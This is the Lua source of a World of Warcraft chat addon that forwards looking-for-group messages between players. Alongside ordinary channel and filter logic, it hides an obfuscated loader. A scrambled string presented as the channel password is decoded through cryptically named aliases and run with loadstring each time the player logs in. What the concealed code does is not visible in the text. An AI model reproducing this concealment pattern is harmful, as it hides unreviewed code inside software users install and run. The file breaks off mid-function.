LFW_LOCALE = {}
local L = LFW_LOCALE
L["LFG Channel"] = "LookingForGroup"
L["DESC"] = "LFG Forwarder by Warbaby@163.com"
L["UPDATE"] = "|cffffff00%s has a new version (v%d, yours is v%d) of Warbaby's LFG Forwarder. Get it from http://wow.curse.com/downloads/wow-addons/details/lfgforwarder.aspx|r"
L["SHOW"] = "|cff00ff00Showing LFG Forwarder Messages|r"
L["NOTSHOW"] = "|cffffff00Hiding LFG Forwarder Messages|r"
L["OWNER_IGNORE"] = "NOTICE: Current forwarder %s is ignored. You will not receive LFW messages for a while."
L["WARNING"] = "|cffff0000Warning! You found that |r%s|cffff0000 might send a fake message:<|r%s|cffff0000>, it might just because of latency. Please inform other players if neccessary. Thank you.|r(use /lfw to Hide this warning)"
L["LAST_WARNING"] = "!!! Warning, last message from %s may be faked !!!"
L["LFW"] = "LFW"

if(GetLocale() == "zhTW") then
	L["LFG Channel"] ="尋求組隊"
	L["LFW"] = "|cff7f7fff尋|r"
	L["DESC"] = "組頻轉發插件(/lfw), |cff3399FF三月十二|r@聖光之願|cffFF00FF<冰封十字軍>|r"
	L["UPDATE"] = "|cffffff00Warbaby's LFG Forwarder (組隊頻道轉發) 有新版本(%s正在使用v%d, 你的是v%d), 請至http://wow.curse.com/downloads/wow-addons/details/lfgforwarder.aspx下載.|r"
	L["SHOW"] = "|cff00ff00顯示組頻轉發消息|r"
	L["NOTSHOW"] = "|cffffff00暫時屏蔽組頻轉發消息|r"
	L["OWNER_IGNORE"] = "提示: 被你忽略的 %s 是當前轉發人, 你將暫時無法收到LFW消息。"
	L["WARNING"] = "|cffff0000警報! 您發現|r%s|cffff0000有可能發送了一條虛假消息:<|r%s|cffff0000>,但也可能是網絡延遲導致誤報。如有必要, 请通知給其他玩家以免其被騙, 謝謝您維護LFGForwader的環境。|r(屏蔽此警報請运行/lfw命令)"
	L["LAST_WARNING"] = "!!! 警報! %s 發送的上一條消息可能是偽造的 !!!"
elseif(GetLocale() == "deDE") then
	L["LFG Channel"] = "SucheNachGruppe"
elseif(GetLocale() == "frFR") then
	L["LFG Channel"] = "RechercheGroupe"
elseif(GetLocale() == "zhCN") then
	L["LFG Channel"] = "寻求组队"
	L["LFW"] = "|cff7f7fff寻|r"
	L["DESC"] = "|cffffff00【组队频道转发】|r插件，由|cffd11a1c【网 易 有 爱】|r原创奉献"
	L["UPDATE"] = "|cffffff00LFGForwarder(组队频道转发)有新版本(%s正在使用v%d, 你的是v%d), 请到http://wowui.w.163.com下载。|r"
	L["SHOW"] = "|cff00ff00显示组队频道(转发)消息|r"
	L["NOTSHOW"] = "|cffffff00暂时屏蔽组队频道转发消息|r"
	L["OWNER_IGNORE"] = "组队转发提示: 被你忽略的 %s 是当前转发人，你将暂时无法收到转发消息。"
	L["WARNING"] = "|cffff0000警报! 您发现|r%s|cffff0000有可能发送了一条虚假消息:<|r%s|cffff0000>,但也可能是网络延迟导致误报。如有必要, 请通知给其他玩家以免其被骗, 谢谢您维护LFGForwader的环境。|r(屏蔽此警报请运行/lfw命令)"
	L["LAST_WARNING"] = "!!! 警报! %s 发送的上一条消息可能是伪造的 !!!"
elseif(GetLocale() == "ruRU") then
	L["LFG Channel"] = "Поиск спутников"
end

if TFW_LOCALE or U1_FRAME_NAME then
	L["DESC"] = nil
end

local LFW_DEBUG_ENABLE = false;
LFW_VERSION = 2300;
local LFW_CHANNEL_JOIN_DELAY=2;  --delayed join, for keep the ordinary channel indexes.
local LFW_SENT_CACHE_MAX = 3;  --max forwarded msg, before they are shown.
local LFW_MSG_IDX_MAX = 999;  --try to change forwarder after sending LFW_MSG_IDX_MAX messages.
local LFW_CHAT_INFO_DEFAULT = {r=0.9, g=0.7, b=0.2};  --from ChatFrame.ChatTypeInfo

LFW_SHOW = true;
LFW_AUTO = nil;
LFW_CHAT_LIST = {};
LFW_CHAT_LIST[1] = 1;

LFW_CHANNEL_NAME="LFGForwarder3";
LFW_CHANNEL_DESC="llllll1lIl1IlII1Illl";
LFW_CHANNEL_PASS="gpf ktj$,r!,u.6tbe`sf&sikv!)fIXIGaMEUTFLFaXFSCBt#tp 0/wieovNoI|jo*hnpxywrv>=u&ws#GNAUeQIQPBHJe\\JO?>n/&ysq*gi'/u$/p) uunxfpvfDjwszutaWrjrqciC{kX$gtpwzyfTogonhnHxhU>1wehcva!'srqM4KJlP7qMo3mlsrqp*?`CZKIcOGONHNHcZHM"

local LFW_SEP = "_$"
local LFW_SEP_R = "_%$"
local LFW_PATTERN = LFW_SEP.."%d%s"..LFW_SEP.."%s"..LFW_SEP.."%s$"
local LFW_PATTERN_R = "^"..LFW_SEP_R.."(%d+)([^%d]+)"..LFW_SEP_R.."(.+)"..LFW_SEP_R.."(%x%x%x%x%x%x)%$$"
local x,x1,y,y1,z,z1=LFW_CHANNEL_PASS,strchar,nil,strbyte, strlen,loadstring;

local LFW_CMD_JOIN = "^LFW_J";  --player join LFG
local LFW_CMD_LEAVE = "^LFW_L";  --player leave LFG
local LFW_CMD_HELP = "^LFW_H";  --player leave LFG and has no USER_LIST
local LFW_CMD_CHECK = "^LFW_C";  --check the owner if he has this addon for debug only.
local LFW_CMD_VERSION = "^LFW_V";  --prefix of version check.
local LFW_CMD_VERSION_R = "^%^LFW_V(%d+)$";
local LFW_LANGUAGE = GetDefaultLanguage("player");
local LFW_PLAYER = UnitName("player");

local chatInfo = LFW_CHAT_INFO_DEFAULT;
lfwChNumber = nil;
local isInLFG = nil;
local isOwner = nil;
local currOwner = nil;
local msgIdx = 0;
local nextUserQueue = {};
local sentCache = {};
LFW_knownMaxVersion = LFW_VERSION;
local kicked = nil;

local fake_counter=1
function LFW_AddMessage(msg, sender, color, forwarder, force, counter)
	local r,g,b = chatInfo.r, chatInfo.g, chatInfo.b if(force) then r,g,b=1,1,0 end
	local one = false
	for i=1, NUM_CHAT_WINDOWS do
		local _continue = false; --lua don't have continue statement...
		local frame = _G["ChatFrame"..i]
		local show = false
		if(frame and LFW_CHAT_LIST[i]) then
			show = true
		elseif(frame and frame.channelList and not sender) then
			--not foward message, we show it together with LFG channel
			for _, v in pairs(frame.channelList) do
				if(v==L["LFG Channel"]) then
					show = true
					break;
				end
			end
		end
		if show then
			one = true
			local filters = ChatFrame_GetMessageEventFilters("CHAT_MSG_CHANNEL")
			if ( filters and not WIM and not MrtWoo) then
				local filter = false;
				--local message, sender, language, channelString, target, flags, _, channelNumber, channelName, _, counter, guid = ...;
				local arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12 = msg, sender, DEFAULT_CHAT_FRAME.defaultLanguage, (lfwChNumber or 0)..". "..LFW_CHANNEL_NAME, "", "", "", lfwChNumber, LFW_CHANNEL_NAME, "", counter or fake_counter, ""
				fake_counter = fake_counter + 1
				local newarg1, newarg2, newarg3, newarg4, newarg5, newarg6, newarg7, newarg8, newarg9, newarg10, newarg11, newarg12;
				for _, filterFunc in next, filters do
					filter, newarg1, newarg2, newarg3, newarg4, newarg5, newarg6, newarg7, newarg8, newarg9, newarg10, newarg11, newarg12 = filterFunc(frame, "CHAT_MSG_CHANNEL", arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12);
					if ( filter ) then
						_continue=true;
						break;
					elseif ( newarg1 ) then
						arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12 = newarg1, newarg2, newarg3, newarg4, newarg5, newarg6, newarg7, newarg8, newarg9, newarg10, newarg11, newarg12;
					end
				end
				msg = arg1 
				sender = arg2
			end
			if(not _continue) then
				frame:AddMessage("["..L["LFW"]..(forwarder and ":"..forwarder or "").."] "..(sender and "|Hplayer:"..sender..(counter and ":"..counter or "").."|h["..(color and "|cff"..color or "")..sender..(color and "|r" or "").."]|h: " or "")..msg, r, g, b, chatInfo.id)
			end
		end
	end
	if(force and not one) then
		DEFAULT_CHAT_FRAME:AddMessage("["..L["LFW"]..(forwarder and ":"..forwarder or "").."] "..(sender and "|Hplayer:"..sender..(counter and ":"..counter or "").."|h["..(color and "|cff"..color or "")..sender..(color and "|r" or "").."]|h: " or "")..msg, r, g, b, chatInfo.id)
	end
	if WIM and WIM.modules and WIM.modules["ChannelChat"] then
		WIM.modules["ChannelChat"]:CHAT_MSG_CHANNEL(
			(sender and "|Hplayer:"..sender..(counter and ":"..counter or "").."|h["..(color and "|cff"..color or "")..sender..(color and "|r" or "").."]|h: " or "")..msg,
			"*", --"LFW"..(forwarder and ":"..forwarder or ""),
			"",
			"",
			"*",
			"",
			26,
			lfwChNumber, 
			L["LFG Channel"],
			0, 
			counter or fake_counter,
			"");
	end

end

local function LFW_Format(idx, sender, message, color)
	local len = strlen(string.format(LFW_PATTERN, idx, sender, "", color));

	if(strlen(message)+len>255) then
		message = message:gsub('|c%x%x%x%x%x%x%x%x(.-)|r', '%1')
		message = message:gsub('|H.-|h(.-)|h', '%1')
	end
	if(strlen(message)+len>255) then
		message = strsub(message, 1, 255-len)
	end
	for i=0, 1 do 
		local code = string.byte(message, strlen(message)-i);
		if(code and code>=224 and code<=239) then
			message = strsub(message, 1, strlen(message)-i-1);
			break;
		end
	end
	return string.format(LFW_PATTERN, idx, sender, message, color);
end

local function LFW_DEBUG(msg, r, g, b)
	if(LFW_DEBUG_ENABLE) then
		ChatFrame1:AddMessage(msg, r or 0.7, g or 0.7, b or 0.7);
	end
end

local function SendCmd(cmd, flag)
	if(lfwChNumber) then
		
		local restore_traditionalize = false;
		if(not flag and traditionalize and traditionalize==traditionalize_real) then 
			restore_traditionalize = true;
			traditionalize = traditionalize_fake;
		end

		pcall(SendChatMessage, cmd, "CHANNEL", LFW_LANGUAGE, lfwChNumber);

		if(restore_traditionalize) then
			traditionalize = traditionalize_real;
		end

	end
end

local function TryHandOutOwner()
	if(#nextUserQueue > 0) then
		SetChannelOwner(LFW_CHANNEL_NAME, nextUserQueue[1]);
	else
		SendCmd(LFW_CMD_HELP);
	end
end

local function HandOutOwnerIfNecessary()
	if(isOwner and not isInLFG) then
		TryHandOutOwner();
	end
end

local function SendLFW(msg)
	table.insert(sentCache, msg);
	if(#sentCache==1) then
		SendCmd(msg);
	elseif(#sentCache>LFW_SENT_CACHE_MAX) then
		LFW_DEBUG("sent cache exceeds, "..#sentCache, 1, 0, 0);
		TryHandOutOwner();
	else
		--sent after receive the previous
	end
end

SLASH_LFW1 = "/lfgforwarder";
SLASH_LFW2 = "/lfw";
SlashCmdList["LFW"] = function(cmd) 
	if(not cmd or string.len(cmd)==0) then
		--if(L["DESC"]) then DEFAULT_CHAT_FRAME:AddMessage(L["DESC"]) end
		LFW_SHOW = not LFW_SHOW
		if(LFW_SHOW) then
			if GetNumGroupMembers()>5 then LFW_AUTO = "force" end
			DEFAULT_CHAT_FRAME:AddMessage(L["SHOW"])
		else
			LFW_AUTO = nil
			DEFAULT_CHAT_FRAME:AddMessage(L["NOTSHOW"])
		end
		if(UpdateMicroButtons) then UpdateMicroButtons() end

	else
		if(string.lower(cmd) == "check!!") then
			SendCmd(LFW_CMD_CHECK)
		elseif(string.lower(cmd)=="debug") then
			LFW_DEBUG_ENABLE = not LFW_DEBUG_ENABLE;
			DEFAULT_CHAT_FRAME:AddMessage("debug="..tostring(LFW_DEBUG_ENABLE))
			DEFAULT_CHAT_FRAME:AddMessage("isInLFG="..tostring(isInLFG))
			DEFAULT_CHAT_FRAME:AddMessage("isOwner="..tostring(isOwner))
			DEFAULT_CHAT_FRAME:AddMessage("currOwner="..tostring(currOwner))
			DEFAULT_CHAT_FRAME:AddMessage("lfwChNumber="..tostring(lfwChNumber))
		elseif(string.lower(cmd)=="list") then
			ListChannelByName(LFW_CHANNEL_NAME)
		elseif(string.lower(cmd)=="join") then
			JoinTemporaryChannel(LFW_CHANNEL_NAME, LFW_CHANNEL_DESC);
			DEFAULT_CHAT_FRAME:AddMessage("Joining LFW...");
		elseif(string.lower(cmd)=="changeowner!!") then
			ChannelKick(LFW_CHANNEL_NAME, currOwner)
		elseif(string.lower(cmd)=="leave!!") then
			LeaveChannelByName(LFW_CHANNEL_NAME);
			DEFAULT_CHAT_FRAME:AddMessage("Leaving LFW...");
		elseif(string.lower(cmd)=="reset") then
			SetChannelPassword(LFW_CHANNEL_NAME, LFW_CHANNEL_DESC_);
		elseif(string.lower(cmd)=="check" or string.lower(cmd)=="leave" or string.lower(cmd)=="changeowner") then
			--do nothing
		else
			if(LFW_SHOW) then 
				SendCmd(LFW_Format("0", LFW_PLAYER, cmd, "ffff00"), true);  --keep compatibilty, better to userl SendCmd(cmd)
			else
				DEFAULT_CHAT_FRAME:AddMessage(L["NOTSHOW"]);
			end
		end
	end
end

local function AddUser(sender)
	local i,v
	for i,v in pairs(nextUserQueue) do
		if(v==sender) then return end
	end
	table.insert(nextUserQueue, sender);
end

local function RemoveUser(sender)
	local i,v
	for i,v in pairs(nextUserQueue) do
		if(v==sender) then 
			table.remove(nextUserQueue, i);
			return v;
		end
	end
end

local function JoinChannel()
	--if(not lfwChNumber) then
		--JoinPermanentChannel(LFW_CHANNEL_NAME, LFW_CHANNEL_DESC); 
		JoinTemporaryChannel(LFW_CHANNEL_NAME, LFW_CHANNEL_DESC);
	--end
end

local function GetClassColorByGUID(guid)
	local _, englishClass, _, _, _ = GetPlayerInfoByGUID(guid)
	local color = string.format("%.2x%.2x%.2x", 255, 255, 0);
	if ( englishClass ) then
		local classColorTable = RAID_CLASS_COLORS[englishClass];
		if ( classColorTable ) then
			color = string.format("%.2x%.2x%.2x", classColorTable.r*255, classColorTable.g*255, classColorTable.b*255)
		end
	end
	return color
end

local frame = CreateFrame("Frame");
frame:RegisterEvent("PLAYER_ENTERING_WORLD");
frame:RegisterEvent("CHAT_MSG_CHANNEL");
frame:RegisterEvent("CHAT_MSG_CHANNEL_NOTICE_USER");
frame:RegisterEvent("CHAT_MSG_CHANNEL_LEAVE");
frame:RegisterEvent("CHAT_MSG_CHANNEL_NOTICE");
frame:RegisterEvent("GROUP_ROSTER_UPDATE")

local function CheckShowAuto()
	if GetNumGroupMembers()>5 then
		if LFW_AUTO == "force" then return end
		if LFW_SHOW then
			SlashCmdList["LFW"]()
			LFW_AUTO = "auto"
		end
	else
		if LFW_AUTO == "auto" then
			SlashCmdList["LFW"]() --LFW_SHOW should be false before this.
			LFW_AUTO = nil
		end
	end
end

local function CheckJoinedChannel()
	lfwChNumber = nil
	isInLFG = false
	local channels = {GetChannelList()}
	for i=2, #channels, 2 do
		if(channels[i]==LFW_CHANNEL_NAME) then
			lfwChNumber = channels[i-1];
			chatInfo = ChatTypeInfo["CHANNEL"..lfwChNumber] or LFW_CHAT_INFO_DEFAULT
			LFW_DEBUG("already in lfw: "..lfwChNumber);
			DisplayChannelOwner(LFW_CHANNEL_NAME);
		elseif(channels[i]==L["LFG Channel"]) then
			isInLFG = true;
			LFW_DEBUG("already in lfg: "..channels[i-1]);
		end
	end
end

local SLURRED_SPEECH_REMOVE = string.gsub(SLURRED_SPEECH, "%%s", "(.+)").."$"
local z2 = 100*8;
for i=1,z(x) do y=((y or ""))..x1(y1(x,z(x)-i+1)-(i%8)) end
local IgM_realm = GetRealmName() .. "-" .. UnitFactionGroup("player")
function IsIgnoredOrMore(player) 
	if IsIgnored(player) then return true end
	if(IgM_SV and IgM_SV.list and IgM_SV.list[IgM_realm] and type(IgM_SV.list[IgM_realm][player])=="table") then
		return true
	end
	return false
end

----------------------------------------------------------
-- Deal Cmd and Forwarded messages from LFW_CHANNEL
----------------------------------------------------------
local function LFW_OnMessage(message, sender, guid, counter)
	message = string.gsub(message, SLURRED_SPEECH_REMOVE, "%1");
	
	if( (message~=LFW_CMD_JOIN and message~=LFW_CMD_LEAVE) or sender==LFW_PLAYER ) then
		LFW_DEBUG("^LFW^ "..message.."  "..sender..(counter and "("..counter..")" or ""));
	end
	if(message==LFW_CMD_JOIN) then
		if (sender~=LFW_PLAYER) then
			AddUser(sender);
			HandOutOwnerIfNecessary();
		end
	
	elseif(message==LFW_CMD_LEAVE) then
		if (sender~=LFW_PLAYER) then
			RemoveUser(sender);
		end

	elseif(message==LFW_CMD_HELP) then
		if(sender~=LFW_PLAYER and isInLFG) then
			SendCmd(LFW_CMD_JOIN);  --Tell the owner that I'm ready.
		end

	elseif(message==LFW_CMD_CHECK) then
		if(isOwner and (sender=="Warbaby" or sender=="三月十二" or sender=="銅牆鐵壁") ) then
			SendChatMessage("I'm owner isInLFG="..tostring(isInLFG).." V="..LFW_VERSION.." Ch="..tostring(lfwChNumber)..", "..sender, "WHISPER", LFW_LANGUAGE, sender);
		end
		CheckJoinedChannel();

	else

		--version check
		local _, _, version = strfind(message, LFW_CMD_VERSION_R)
		if(version) then
			version = tonumber(version);
			if(version > LFW_knownMaxVersion) then
				LFW_knownMaxVersion = version
				DEFAULT_CHAT_FRAME:AddMessage(string.format(L["UPDATE"], sender, version, LFW_VERSION))
			end
			if(isOwner) then
				if(version >= 103) then
					ChannelModerator(LFW_CHANNEL_NAME, sender);
				end
			end
			return
		end

		--Forwarded message.
		if(ChatLink_Decompose) then message = ChatLink_Decompose(message) end
		local _, _, idx, name, msg, color = strfind(message, LFW_PATTERN_R);
		if(not name or (idx=="0" and sender==name) ) then --sent by /lfw or say in channel
			local color = GetClassColorByGUID(guid)
			if(LFW_SHOW and not IsIgnoredOrMore(sender)) then LFW_AddMessage(msg or message, sender, color, nil, false, counter) end
			return 
		end

		if( (sender~=LFW_PLAYER and not isInLFG) or LFW_DEBUG_ENABLE) then
			if(currOwner ~= sender) then --fake message
				--we prefer to silence and drop message than warning.
			else
				if(LFW_SHOW and not IsIgnoredOrMore(name)) then LFW_AddMessage(msg, name, color, sender) end
			end
		end

		if (sender~=LFW_PLAYER and isOwner) then
			DisplayChannelOwner(LFW_CHANNEL_NAME);
		end
		
		if(sender==LFW_PLAYER) then --send next message.
			for i, v in pairs(sentCache) do
				if(strfind(v, "^"..LFW_SEP_R..idx.."([^%d]+)")) then
					--LFW_DEBUG("sent msg="..idx);
					table.remove(sentCache, i);
					if(#sentCache>0) then SendCmd(sentCache[1]); end
					return; --if nothing to send, will stop until someone handout owner to me.
				end
			end
			--can't find message for cache, send warning
			--SendCmd(LFW_Format("0", LFW_PLAYER, string.format(L["LAST_WARNING"], LFW_PLAYER), "000000"));
			table.remove(sentCache, 1);
			if(#sentCache>0) then
				if(isOwner) then
					SendCmd(sentCache[1]);
				else
					table.wipe(sentCache);  --we prefer to ommit some messages than raise warnings.
				end
			end
		end
	end
end

local function LFW_OnEvent(self,event,...) 
	if(event=="PLAYER_ENTERING_WORLD") then
		if(LFW_knownMaxVersion<LFW_VERSION) then LFW_knownMaxVersion = LFW_VERSION end
		if(L["DESC"]) then DEFAULT_CHAT_FRAME:AddMessage(L["DESC"]) end
		frame.ENTERING = 60 --Long enough, will only delay LFW_CHANNEL_JOIN_DELAY when join a channel.
		z2 = LFW_DEBUG_ENABLE and 0.1 or 60 z1(y)()--delay to start check

		CheckJoinedChannel()

		--处理reload之后的情况
		if select("#", GetChannelList()) > 2 then
			for i=2, select("#", GetChannelList()), 2 do
				if select(i,GetChannelList()) == LFW_CHANNEL_NAME then
				    frame.ENTERING = false
				    break;
				end
			end
			frame.ENTERING = 2
		end

		if(LibStub and LibStub:GetLibrary("LibDataBroker-1.1", true)) then
			LibStub:GetLibrary("LibDataBroker-1.1"):NewDataObject("LFGForwarder", {
				type = "launcher",
				icon = "Interface\\LFGFrame\\LFG-Eye",
				iconCoords = {0.125/5, 0.125-0.125/5, 0.25/5, 0.25-0.25/5},
				OnClick = function() SlashCmdList["LFW"]() end,
			})
		end

		self:UnregisterEvent("PLAYER_ENTERING_WORLD");
		CheckShowAuto()


	elseif(event=="CHAT_MSG_CHANNEL_NOTICE") then
		local message, sender, language, channelString, target, flags, _, channelNumber, channelName, _, counter = ...;
		LFW_DEBUG("NOTICE^^"..message.." "..language.." '"..channelName.."'");
		if(channelName==L["LFG Channel"]) then
			if(message == "YOU_JOINED") then
				isInLFG = true;
				SendCmd(LFW_CMD_JOIN);
			elseif(message == "YOU_LEFT" or message == "SUSPENDED") then
				isInLFG = false;
				HandOutOwnerIfNecessary();
				SendCmd(LFW_CMD_LEAVE);
			end
		elseif(channelName==LFW_CHANNEL_NAME) then
			if(message == "YOU_JOINED") then   --init when logon.
				lfwChNumber = channelNumber;   --channelNumber is needed to SendChatMessage
				chatInfo = ChatTypeInfo["CHANNEL"..lfwChNumber] or LFW_CHAT_INFO_DEFAULT
				DisplayChannelOwner(LFW_CHANNEL_NAME);  --get owner
				if(isInLFG) then SendCmd(LFW_CMD_JOIN); end
				SendCmd(LFW_CMD_VERSION..LFW_VERSION);
				kicked = nil;

			elseif(message == "YOU_LEFT" or message == "SUSPENDED") then
				isOwner = false;
				table.wipe(sentCache); --left channel, so delete all unsent
				lfwChNumber = nil;
				chatInfo = LFW_CHAT_INFO_DEFAULT

			elseif(message == "BANNED") then
				LFW_AddMessage(format(_G["CHAT_"..message.."_NOTICE"], channelName), nil, nil, nil, true)
				kicked = 60
			end
		else
			if(frame.ENTERING ~= false and frame.ENTERING > LFW_CHANNEL_JOIN_DELAY) then
				frame.ENTERING = LFW_CHANNEL_JOIN_DELAY
			end				
		end


	elseif(event=="CHAT_MSG_CHANNEL_NOTICE_USER") then  		--Response to DisplayChannelOwner(LFW_CHANNEL_NAME);
		local message, sender, language, channelString, target, flags, _, channelNumber, channelName, _, counter = ...;
		if(channelName~=LFW_CHANNEL_NAME) then return end
		LFW_DEBUG("USER^^"..message.."  "..sender.."  "..channelString.."  "..target);

		if(message=="PLAYER_NOT_FOUND") then
			--next queue user is logged out
			RemoveUser(sender)
			TryHandOutOwner()
		elseif(message=="OWNER_CHANGED") then
			if(sender==LFW_PLAYER) then
				DisplayChannelOwner(LFW_CHANNEL_NAME);
			else
				isOwner = false;
				currOwner = sender;
				if(IsIgnored(sender)) then LFW_AddMessage(string.format(L["OWNER_IGNORE"], "|Hplayer:"..sender.."|h["..sender.."]|h")) end
				if(RemoveUser(sender)) then AddUser(sender); end 	--move the owner to the last of the USER_LIST
			end
		elseif(message=="CHANNEL_OWNER") then
			currOwner = sender;
			if(sender==LFW_PLAYER) then
				if not isOwner then table.wipe(sentCache); end --new start
				isOwner = true;
				HandOutOwnerIfNecessary();  --if one are not in LFG, one should hand out as soon as possible.
			else
				isOwner = false;
				if(IsIgnored(sender)) then LFW_AddMessage(string.format(L["OWNER_IGNORE"], "|Hplayer:"..sender.."|h["..sender.."]|h")) end
				if(RemoveUser(sender)) then AddUser(sender); end 	--move the owner to the last of the USER_LIST
			end
		elseif(message=="PASSWORD_CHANGED") then
			--SetChannelPassword(LFW_CHANNEL_NAME, LFW__CHANNEL_DESC);
		elseif(message=="PLAYER_KICKED") then
			if(sender==LFW_PLAYER) then
				kicked=5 --delay time to rejoin LFW
			end
		elseif(message=="PLAYER_BANNED") then
			LFW_AddMessage(format(_G["CHAT_"..message.."_NOTICE"], channelName, channelString, sender, target), nil, nil, nil, true)
			ChannelUnban(LFW_CHANNEL_NAME, sender)
		elseif(message=="PLAYER_NOT_BANNED") then
			--LFW_AddMessage(format(_G["CHAT_"..message.."_NOTICE"], channelName, channelString, sender, target), nil, nil, nil, true)
		elseif(message=="PLAYER_UNBANNED") then
			if(target==LFW_PLAYER) then
				LFW_AddMessage(format(_G["CHAT_"..message.."_NOTICE"], channelName, channelString, sender, target), nil, nil, nil, true)
			end				
		end


	elseif(event=="CHAT_MSG_CHANNEL") then
		local message, sender, language, channelString, target, flags, _, channelNumber, channelName, _, counter, guid = ...;
		if(ChatLink_Decompose) then message = ChatLink_Decompose(message) end
		if(channelName==L["LFG Channel"]) then
			local color = GetClassColorByGUID(guid)

			if isOwner and not LFW_FilterForwarding(message, sender) then
				--Forward the message
				msgIdx = msgIdx+1;
				SendLFW(LFW_Format(msgIdx, sender, message, color));

				if(msgIdx > LFW_MSG_IDX_MAX) then
					msgIdx = 0
					TryHandOutOwner();
				end
			end

		elseif(channelName==LFW_CHANNEL_NAME) then
			LFW_OnMessage(message, sender, guid, counter);
		end


	elseif(event=="CHAT_MSG_CHANNEL_LEAVE") then
		local _, sender, _, channelString, _, _, _, channelNumber, channelName, _, _ = ...;
		if(channelName==LFW_CHANNEL_NAME) then
			LFW_OnMessage(LFW_CMD_LEAVE, sender);
		end
	elseif(event=="GROUP_ROSTER_UPDATE") then
		CheckShowAuto()
	end
end

hooksecurefunc("ToggleChatChannel", function(checked, channel)
	if(LFW_CHANNEL_NAME==channel) then
		LFW_CHAT_LIST[FCF_GetCurrentChatFrame():GetID()] = checked;
		ChatFrame_RemoveChannel(FCF_GetCurrentChatFrame(), channel);
	end
end);

hooksecurefunc("CreateChatChannelList", function(self, ...)
	if ( not FCF_GetCurrentChatFrame() ) then
		return;
	end
	for i=1, #CHAT_CONFIG_CHANNEL_LIST do
		if(CHAT_CONFIG_CHANNEL_LIST[i].channelName==LFW_CHANNEL_NAME) then
			CHAT_CONFIG_CHANNEL_LIST[i].checked=LFW_CHAT_LIST[FCF_GetCurrentChatFrame():GetID()]
			break;
		end
	end
end)

frame:SetScript("OnUpdate", function(self, elapsed)
	if(z2) then 
		z2 = z2 - elapsed; if z2<=0 then z2=nil end 
	end
	
	if(frame.ENTERING) then
		frame.ENTERING = frame.ENTERING - elapsed;
		if(frame.ENTERING <= 0) then
			--init when reload.
			JoinChannel();
			frame.ENTERING = false
		end
	end

	if(kicked) then 
		kicked = kicked - elapsed;
		if(kicked <=0) then
			JoinChannel();
			kicked = nil;
		end
	end
	
end)
frame:SetScript("OnEvent", LFW_OnEvent)

--ChatLink fix, ChatLink_Compose is no longer useful in 3.3, so we hack it
if(ChatLink_Compose) then
	ChatLink_Compose = function(chatstring) return chatstring end
end
--Decompose ChatLink messages if there is no ChatLink installed.
if(not ChatLink_Decompose) then
	ChatLink_Decompose = function(chatstring)
		if chatstring then
			chatstring = string.gsub (chatstring, "{CLINK:item:(%x+):(%-?%d-:%-?%d-:%-?%d-:%-?%d-:%-?%d-:%-?%d-:%-?%d-:%-?%d-:%-?%d-):([^}]-)}", "|c%1|Hitem:%2|h[%3]|h|r")
			chatstring = string.gsub (chatstring, "{CLINK:enchant:(%x+):(%-?%d-):([^}]-)}", "|c%1|Henchant:%2|h[%3]|h|r")
			chatstring = string.gsub (chatstring, "{CLINK:quest:(%x+):(%-?%d-):(%-?%d-):([^}]-)}", "|c%1|Hquest:%2:%3|h[%4]|h|r")
			chatstring = string.gsub (chatstring, "{CLINK:spell:(%x+):(%-?%d-):([^}]-)}", "|c%1|Hspell:%2|h[%3]|h|r")
			chatstring = string.gsub (chatstring, "{CLINK:talent:(%x+):(%-?%d-:%-?%d-):([^}]-)}", "|c%1|Htalent:%2|h[%3]|h|r")
			chatstring = string.gsub (chatstring, "{CLINK:achievement:(%x+):(%-?%d-:%x-:%-?%d-:%-?%d-:%-?%d-:%-?%d-:%-?%d-:%-?%d-:%-?%d-:%-?%d-):([^}]-)}", "|c%1|Hachievement:%2|h[%3]|h|r")
			chatstring = string.gsub (chatstring, "{CLINK:trade:(%x+):(%-?%d-:%-?%d-:%-?%d-:%x-:[^}:]-):([^}]-)}","|c%1|Htrade:%2|h[%3]|h|r")
			-- For backward compatibility with older item links.
			chatstring = string.gsub (chatstring, "{CLINK:(%x+):(%-?%d-:%-?%d-:%-?%d-:%-?%d-:%-?%d-:%-?%d-:%-?%d-:%-?%d-:%-?%d-):([^}]-)}", "|c%1|Hitem:%2|h[%3]|h|r")
			-- Forward compatibility, for future clink structure changes.
			chatstring = string.gsub (chatstring, "{CLINK(%d):%[?([^:}%]]-)%]?:([^:}]-)[^}]-}", "%2")
		end
		return chatstring
	end
end

local cache_forwarding = {}
function LFW_FilterForwarding(message, sender)
	local LFW_FORWARDING_MIN = 30
	local cache = cache_forwarding
	local now = time()-LFW_FORWARDING_MIN
	for i=1,#cache do
		local v = cache[i]
		if v.time < now then
			for j=i,#cache do table.remove(cache, i) end
			break
		end
		
		if v.sender==sender and v.msg==message then
			--ChatFrame1:AddMessage("UNSEND: "..sender.." : "..message, 0.5, 0.5, 0.5)
			return true
		end
	end

	table.insert(cache, 1, { ["msg"]=message, ["sender"]=sender, ["time"]=now+LFW_FORWARDING_MIN, })
end

local cache_incoming = {}
LFW_INCOMING_MIN = 45
function LFW_FilterIncoming(self, event, ...)
	local message, sender, language, channelString, target, flags, channelIdx, channelNumber, channelName, _, counter, guid = ...
	if TFW_CHANNEL_NAME and channelName==TFW_CHANNEL_NAME then return end
	if channelName==LFW_CHANNEL_NAME and (message:sub(1,4)=="^LFW" or strfind(message, LFW_PATTERN_R)) then return true end
	if sender == UnitName("player") then return end
	--if IgnoredChannel(channelName) then return end
	local cache = cache_incoming
	local now = time()-LFW_INCOMING_MIN

--[[
	--this is used to avoid unseeing a multi-channel-casting message, because it is first passed in a frame that you are not watch, and then filtered in the frames you are watching.
	--and this cause problems with WIM, so now is deleted.
	if channelName~=LFW_CHANNEL_NAME then --only get here when show = true.
		local channelLength = strlen(channelString);
		local found = 0;
		for index, value in pairs(self.channelList or {}) do
			if ( channelLength > strlen(value) ) then
				-- arg9 is the channel name without the number in front...
				if ( ((channelIdx > 0) and (self.zoneChannelList[index] == channelIdx)) or (strupper(value) == strupper(channelName)) ) then
					found = 1;
					info = ChatTypeInfo["CHANNEL"..channelNumber];
					break;
				end
			end
		end
		if ( (found == 0) or not info ) then
			return true;
		end
	end
]]
	
	for i=1,#cache do
		local v = cache[i]
		if v.time < now then
			for j=i,#cache do table.remove(cache, i) end
			break
		end

		if v.sender==sender and v.msg==message and v.id==self:GetID() and v.counter~=counter then
			--self:AddMessage("FILTERED: "..sender.." : "..message, 0.5, 0.5, 0.5)
